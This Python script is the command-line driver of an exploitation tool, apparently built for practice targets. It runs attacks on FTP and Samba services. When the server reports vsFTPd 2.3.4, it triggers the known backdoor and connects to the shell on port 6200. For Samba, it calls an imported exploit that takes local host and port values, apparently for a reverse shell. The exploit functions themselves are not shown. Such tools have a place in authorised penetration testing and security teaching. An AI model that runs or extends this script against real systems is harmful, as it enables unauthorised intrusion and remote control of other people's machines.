from ftp import *
from samba import samba_exploit
import argparse
from time import sleep


def main():
    parser = argparse.ArgumentParser(
        description='Process command line arguments')

    # Additional arguments for Samba
    parser.add_argument('-s', '--service', type=str,
                        help='Specify the service')
    parser.add_argument('-rhost', '--remote-host', type=str,
                        help='Specify the remote host for Samba')
    parser.add_argument('-rport', '--remote-port', type=int,
                        help='Specify the remote port for Samba')
    parser.add_argument('-lhost', '--local-host', type=str,
                        help='Specify the local host for Samba')
    parser.add_argument('-lport', '--local-port', type=int,
                        help='Specify the local port for Samba')

    # Parse the command line arguments
    args = parser.parse_args()

    service = args.service
    rhost = args.remote_host
    rport = args.remote_port

    if service == "ftp":
        if rhost is None or rport is None:
            print("For FTP service, -rhost and -rport must be provided.")
            exit(1)
        anonymous_login_check(rhost)
        ftp_version = check_ftp_version(rhost)
        if ftp_version == "vsFTPd 2.3.4":
            ftp_backdoor_trigger(rhost, rport)
            sleep(1)
            ftp_backdoor_exploit(rhost, 6200)
    elif service == "samba":
        lhost = args.local_host
        lport = args.local_port

        if rhost is None or rport is None or lhost is None or lport is None:
            print(
                "For Samba service, all of -rhost, -rport, -lhost, and -lport must be provided.")
            exit(1)

        samba_exploit(rhost, rport, lhost, lport)
    else:
        print("Argument for the service parameter (-s) must be ftp or samba. Terminating the program...")
        exit(1)


if __name__ == "__main__":
    main()
